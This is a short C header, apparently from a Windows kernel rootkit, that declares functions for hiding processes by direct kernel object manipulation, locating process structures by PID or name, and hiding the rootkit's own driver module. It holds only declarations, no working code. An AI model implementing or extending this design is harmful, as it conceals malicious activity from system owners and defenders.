#ifndef _RK_DKOM_H_
#define _RK_DKOM_H_

#include <ntddk.h>
#include "rootkit.h"

BOOLEAN OnProcessHide(IN ULONG pid);
ULONG FindProcessEPROCByPid( int terminate_PID );
ULONG FindProcessEPROCByName(char procName[]);
VOID DKOM_HideProcess( PEPROCESS eproces );
BOOLEAN HideRootkitModule();
ULONG GetModuleListBegin (IN PDRIVER_OBJECT  DriverObject);
PMODULE_ENTRY FindModuleEntry(PMODULE_ENTRY pPsLoadedModuleList, PUNICODE_STRING usModuleName);


#endif
